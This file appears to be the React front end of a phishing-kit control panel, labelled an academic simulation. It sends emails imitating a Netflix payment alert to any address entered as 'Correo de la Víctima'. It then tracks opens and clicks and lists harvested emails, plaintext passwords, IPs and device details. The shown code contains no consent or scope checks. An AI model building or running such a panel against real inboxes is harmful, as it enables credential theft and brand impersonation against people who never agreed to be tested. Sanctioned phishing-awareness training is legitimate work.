"use client";

import React, { useState, useEffect } from "react";
import {
  Send,
  Mail,
  Eye,
  MousePointer,
  ShieldAlert,
  RefreshCw,
  Clock,
  Terminal,
  UserCheck,
  Key,
  Globe,
  Monitor,
  CheckCircle,
  AlertTriangle,
  Play
} from "lucide-react";

interface Metrics {
  sent: number;
  opened: number;
  clicked: number;
  compromised: number;
}

interface Capture {
  _id: string;
  campaignId?: string;
  email: string;
  password?: string;
  ip: string;
  browser: string;
  os: string;
  capturedAt: string;
}

interface Campaign {
  _id: string;
  targetEmail: string;
  status: "sent" | "opened" | "clicked" | "compromised";
  sentAt: string;
}

export default function Dashboard() {
  const [metrics, setMetrics] = useState<Metrics>({
    sent: 0,
    opened: 0,
    clicked: 0,
    compromised: 0,
  });
  const [captures, setCaptures] = useState<Capture[]>([]);
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [targetEmail, setTargetEmail] = useState("");
  const [sending, setSending] = useState(false);
  const [sendSuccess, setSendSuccess] = useState<string | null>(null);
  const [sendError, setSendError] = useState<string | null>(null);
  
  // Guardar IDs de contraseñas visibles
  const [visiblePasswords, setVisiblePasswords] = useState<Record<string, boolean>>({});

  const togglePasswordVisibility = (id: string) => {
    setVisiblePasswords((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const fetchStats = async (isSilent = false) => {
    if (!isSilent) setLoading(true);
    else setRefreshing(true);
    try {
      const res = await fetch("/api/stats");
      if (!res.ok) throw new Error("Error fetching stats");
      const data = await res.json();
      setMetrics(data.metrics);
      setCaptures(data.captures);
      setCampaigns(data.campaigns);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    fetchStats();
    // Auto-refresh cada 10 segundos
    const interval = setInterval(() => fetchStats(true), 10000);
    return () => clearInterval(interval);
  }, []);

  const handleLaunchCampaign = async (e: React.FormEvent) => {
    e.preventDefault();
    setSending(true);
    setSendSuccess(null);
    setSendError(null);

    if (!targetEmail) {
      setSendError("Introduce un correo electrónico válido.");
      setSending(false);
      return;
    }

    try {
      const res = await fetch("/api/send-phishing", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: targetEmail }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Error al enviar");

      setSendSuccess(`¡Campaña iniciada! Correo enviado a ${targetEmail}`);
      setTargetEmail("");
      fetchStats(true);
    } catch (err: any) {
      setSendError(err.message || "Error al lanzar la campaña.");
    } finally {
      setSending(false);
    }
  };

  // Helper para renderizar badges de estado
  const renderStatusBadge = (status: string) => {
    switch (status) {
      case "sent":
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-500/10 text-blue-400 border border-blue-500/20">
            <Send className="w-3.5 h-3.5" /> Enviado
          </span>
        );
      case "opened":
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-amber-500/10 text-amber-400 border border-amber-500/20">
            <Mail className="w-3.5 h-3.5" /> Abierto
          </span>
        );
      case "clicked":
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-orange-500/10 text-orange-400 border border-orange-500/20">
            <MousePointer className="w-3.5 h-3.5" /> Clic
          </span>
        );
      case "compromised":
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-500/10 text-red-400 border border-red-500/20 animate-pulse">
            <ShieldAlert className="w-3.5 h-3.5" /> Vulnerado
          </span>
        );
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-[#09090b] text-[#fafafa] font-sans antialiased selection:bg-indigo-500/30 selection:text-white">
      {/* Background Neon Glows */}
      <div className="absolute top-0 left-1/4 w-[500px] h-[500px] bg-indigo-500/5 rounded-full blur-[120px] pointer-events-none -z-10" />
      <div className="absolute bottom-10 right-1/4 w-[600px] h-[600px] bg-violet-600/5 rounded-full blur-[140px] pointer-events-none -z-10" />

      {/* Header */}
      <header className="border-b border-zinc-800/80 bg-zinc-950/50 backdrop-blur sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-lg bg-gradient-to-tr from-indigo-600 to-violet-600 flex items-center justify-center shadow-lg shadow-indigo-500/25">
              <Terminal className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="font-bold text-lg tracking-tight bg-gradient-to-r from-white via-zinc-200 to-zinc-400 bg-clip-text text-transparent">
                ShadowOps Phishing Portal
              </h1>
              <p className="text-[10px] text-zinc-500 font-mono tracking-widest uppercase">
                Academic Simulation Panel
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => fetchStats(true)}
              disabled={refreshing || loading}
              className="p-2 text-zinc-400 hover:text-white hover:bg-zinc-800/60 rounded-lg border border-zinc-800 transition duration-150 active:scale-95 disabled:opacity-50"
              title="Refrescar estadísticas"
            >
              <RefreshCw className={`w-4 h-4 ${refreshing ? "animate-spin" : ""}`} />
            </button>
            <div className="h-5 w-[1px] bg-zinc-800" />
            <span className="text-[11px] font-mono text-emerald-500 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20 flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-ping" />
              Conexión Activa
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 py-8 flex flex-col gap-8">
        {/* KPI Grid */}
        <section className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Tarjeta 1 - Enviados */}
          <div className="bg-zinc-900/50 border border-zinc-800 rounded-xl p-5 relative overflow-hidden group hover:border-zinc-700/80 transition duration-300">
            <div className="absolute top-0 left-0 w-1 h-full bg-blue-500" />
            <div className="flex items-center justify-between text-zinc-400 mb-2">
              <span className="text-sm font-medium">Correos Enviados</span>
              <Send className="w-4 h-4 text-blue-400" />
            </div>
            <div className="text-3xl font-bold tracking-tight">
              {loading ? "..." : metrics.sent}
            </div>
            <div className="text-[11px] text-zinc-500 mt-1 font-mono">
              Campañas Lanzadas
            </div>
          </div>

          {/* Tarjeta 2 - Abiertos */}
          <div className="bg-zinc-900/50 border border-zinc-800 rounded-xl p-5 relative overflow-hidden group hover:border-zinc-700/80 transition duration-300">
            <div className="absolute top-0 left-0 w-1 h-full bg-amber-500" />
            <div className="flex items-center justify-between text-zinc-400 mb-2">
              <span className="text-sm font-medium">Correos Abiertos</span>
              <Eye className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-3xl font-bold tracking-tight">
              {loading ? "..." : metrics.opened}
            </div>
            <div className="text-[11px] text-zinc-500 mt-1 font-mono">
              Tasa de Apertura:{" "}
              {metrics.sent > 0
                ? `${Math.round((metrics.opened / metrics.sent) * 100)}%`
                : "0%"}
            </div>
          </div>

          {/* Tarjeta 3 - Clics */}
          <div className="bg-zinc-900/50 border border-zinc-800 rounded-xl p-5 relative overflow-hidden group hover:border-zinc-700/80 transition duration-300">
            <div className="absolute top-0 left-0 w-1 h-full bg-orange-500" />
            <div className="flex items-center justify-between text-zinc-400 mb-2">
              <span className="text-sm font-medium">Enlaces Clicados</span>
              <MousePointer className="w-4 h-4 text-orange-400" />
            </div>
            <div className="text-3xl font-bold tracking-tight">
              {loading ? "..." : metrics.clicked}
            </div>
            <div className="text-[11px] text-zinc-500 mt-1 font-mono">
              CTR:{" "}
              {metrics.sent > 0
                ? `${Math.round((metrics.clicked / metrics.sent) * 100)}%`
                : "0%"}
            </div>
          </div>

          {/* Tarjeta 4 - Vulnerados */}
          <div className="bg-zinc-900/50 border border-zinc-800 rounded-xl p-5 relative overflow-hidden group hover:border-zinc-700/80 transition duration-300">
            <div className="absolute top-0 left-0 w-1 h-full bg-red-500" />
            <div className="flex items-center justify-between text-zinc-400 mb-2">
              <span className="text-sm font-medium">Datos Comprometidos</span>
              <ShieldAlert className="w-4 h-4 text-red-500" />
            </div>
            <div className="text-3xl font-bold tracking-tight text-red-500">
              {loading ? "..." : metrics.compromised}
            </div>
            <div className="text-[11px] text-zinc-500 mt-1 font-mono">
              Efectividad:{" "}
              {metrics.sent > 0
                ? `${Math.round((metrics.compromised / metrics.sent) * 100)}%`
                : "0%"}
            </div>
          </div>
        </section>

        {/* Dashboard Main Section Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          
          {/* Columna Izquierda: Lanzador de Campaña */}
          <div className="lg:col-span-1 flex flex-col gap-6">
            <section className="bg-zinc-900/40 border border-zinc-800 rounded-2xl p-6 backdrop-blur-md">
              <div className="flex items-center gap-2 mb-4">
                <Play className="w-5 h-5 text-indigo-500" />
                <h2 className="text-lg font-bold">Lanzar Ataque Controlado</h2>
              </div>
              <p className="text-sm text-zinc-400 mb-6">
                Ingresa el correo electrónico de destino para simular un envío de ingeniería social. El destinatario recibirá una alerta falsa del método de pago de Netflix.
              </p>

              <form onSubmit={handleLaunchCampaign} className="flex flex-col gap-4">
                <div>
                  <label className="block text-xs font-mono uppercase text-zinc-500 mb-2">
                    Correo de la Víctima
                  </label>
                  <input
                    type="email"
                    placeholder="ejemplo@correo.com"
                    value={targetEmail}
                    onChange={(e) => setTargetEmail(e.target.value)}
                    required
                    className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2.5 text-white outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition font-mono text-sm"
                  />
                </div>

                <button
                  type="submit"
                  disabled={sending}
                  className="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 cursor-pointer flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]"
                >
                  {sending ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>Enviando Correo...</span>
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4" />
                      <span>Enviar Correo Phishing</span>
                    </>
                  )}
                </button>
              </form>

              {sendSuccess && (
                <div className="mt-4 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-lg p-3 flex items-start gap-2">
                  <CheckCircle className="w-4 h-4 mt-0.5 flex-shrink-0" />
                  <span>{sendSuccess}</span>
                </div>
              )}

              {sendError && (
                <div className="mt-4 bg-red-500/10 border border-red-500/20 text-red-400 text-xs rounded-lg p-3 flex items-start gap-2">
                  <AlertTriangle className="w-4 h-4 mt-0.5 flex-shrink-0" />
                  <span>{sendError}</span>
                </div>
              )}
            </section>

            {/* Consola Informativa de Seguridad */}
            <section className="bg-zinc-900/20 border border-zinc-800/80 rounded-2xl p-6 font-mono text-xs text-zinc-500">
              <div className="flex items-center gap-2 mb-3 text-zinc-400 font-semibold">
                <Terminal className="w-4 h-4 text-indigo-400" />
                <span>Consola del Simulador</span>
              </div>
              <div className="flex flex-col gap-1.5 h-[160px] overflow-y-auto pr-2 scrollbar-thin">
                <p className="text-zinc-600">[INFO] Conectado a MongoDB Atlas.</p>
                <p className="text-zinc-600">[INFO] Escuchando eventos HTTP en tiempo real.</p>
                {campaigns.slice(0, 4).map((c) => (
                  <div key={c._id} className="text-zinc-500 border-l border-zinc-800 pl-2 py-0.5">
                    <span className="text-zinc-600">[{new Date(c.sentAt).toLocaleTimeString()}]</span> Campaña creada para{" "}
                    <span className="text-zinc-400">{c.targetEmail.substring(0, 15)}...</span> (Status: {c.status})
                  </div>
                ))}
              </div>
            </section>
          </div>

          {/* Columna Derecha: Víctimas y Campañas */}
          <div className="lg:col-span-2 flex flex-col gap-6">
            
            {/* Tabla de Credenciales Capturadas */}
            <section className="bg-zinc-900/40 border border-zinc-800 rounded-2xl overflow-hidden backdrop-blur-md">
              <div className="p-6 border-b border-zinc-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <UserCheck className="w-5 h-5 text-red-500" />
                  <h2 className="text-lg font-bold">Datos Capturados (Simulado)</h2>
                </div>
                <span className="text-[11px] font-mono text-zinc-500">
                  Total capturados: {captures.length}
                </span>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-sm">
                  <thead>
                    <tr className="border-b border-zinc-800 bg-zinc-950/20 text-zinc-400 font-mono text-xs">
                      <th className="p-4">Email</th>
                      <th className="p-4">Contraseña</th>
                      <th className="p-4">Dispositivo</th>
                      <th className="p-4">Origen / IP</th>
                      <th className="p-4">Fecha</th>
                    </tr>
                  </thead>
                  <tbody>
                    {loading ? (
                      <tr>
                        <td colSpan={5} className="p-8 text-center text-zinc-500">
                          Cargando capturas...
                        </td>
                      </tr>
                    ) : captures.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="p-8 text-center text-zinc-500 italic">
                          Esperando a que la víctima inicie sesión...
                        </td>
                      </tr>
                    ) : (
                      captures.map((cap) => (
                        <tr
                          key={cap._id}
                          className="border-b border-zinc-800 hover:bg-zinc-800/20 transition duration-150"
                        >
                          {/* Email */}
                          <td className="p-4 font-semibold text-zinc-200">
                            {cap.email}
                          </td>
                          {/* Contraseña */}
                          <td className="p-4 font-mono">
                            <div className="flex items-center gap-2">
                              <span className="text-zinc-300">
                                {visiblePasswords[cap._id]
                                  ? cap.password || "Ninguna"
                                  : "••••••••"}
                              </span>
                              <button
                                onClick={() => togglePasswordVisibility(cap._id)}
                                className="text-zinc-500 hover:text-white p-0.5 rounded hover:bg-zinc-800 transition"
                                title="Mostrar/Ocultar"
                              >
                                <Eye className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          </td>
                          {/* Dispositivo (OS / Browser) */}
                          <td className="p-4">
                            <div className="flex flex-col gap-0.5 text-xs">
                              <span className="flex items-center gap-1 text-zinc-300">
                                <Monitor className="w-3 h-3 text-zinc-500" />
                                {cap.os}
                              </span>
                              <span className="text-zinc-500">
                                {cap.browser}
                              </span>
                            </div>
                          </td>
                          {/* Origen / IP */}
                          <td className="p-4 font-mono text-xs text-zinc-400">
                            <div className="flex flex-col">
                              <span>{cap.ip}</span>
                              <span className="text-[10px] text-zinc-600 flex items-center gap-0.5">
                                <Globe className="w-2.5 h-2.5" /> Localhost
                              </span>
                            </div>
                          </td>
                          {/* Fecha */}
                          <td className="p-4 text-xs text-zinc-500 font-mono">
                            <div className="flex items-center gap-1">
                              <Clock className="w-3.5 h-3.5" />
                              {new Date(cap.capturedAt).toLocaleTimeString()}
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </section>

            {/* Listado de Campañas Activas */}
            <section className="bg-zinc-900/40 border border-zinc-800 rounded-2xl overflow-hidden backdrop-blur-md">
              <div className="p-6 border-b border-zinc-800">
                <h2 className="text-lg font-bold">Registro General de Campañas</h2>
              </div>

              <div className="overflow-x-auto max-h-[300px] overflow-y-auto">
                <table className="w-full text-left border-collapse text-sm">
                  <thead>
                    <tr className="border-b border-zinc-800 bg-zinc-950/20 text-zinc-400 font-mono text-xs">
                      <th className="p-4">Destinatario</th>
                      <th className="p-4">Estado</th>
                      <th className="p-4">Enviado</th>
                    </tr>
                  </thead>
                  <tbody>
                    {loading ? (
                      <tr>
                        <td colSpan={3} className="p-8 text-center text-zinc-500">
                          Cargando campañas...
                        </td>
                      </tr>
                    ) : campaigns.length === 0 ? (
                      <tr>
                        <td colSpan={3} className="p-8 text-center text-zinc-500 italic">
                          Aún no se han enviado campañas de simulación.
                        </td>
                      </tr>
                    ) : (
                      campaigns.map((camp) => (
                        <tr
                          key={camp._id}
                          className="border-b border-zinc-800 hover:bg-zinc-800/10 transition duration-150"
                        >
                          <td className="p-4 font-mono text-xs text-zinc-300">
                            {camp.targetEmail}
                          </td>
                          <td className="p-4">
                            {renderStatusBadge(camp.status)}
                          </td>
                          <td className="p-4 text-xs text-zinc-500 font-mono">
                            {new Date(camp.sentAt).toLocaleString()}
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </section>
          </div>

        </div>
      </main>
    </div>
  );
}
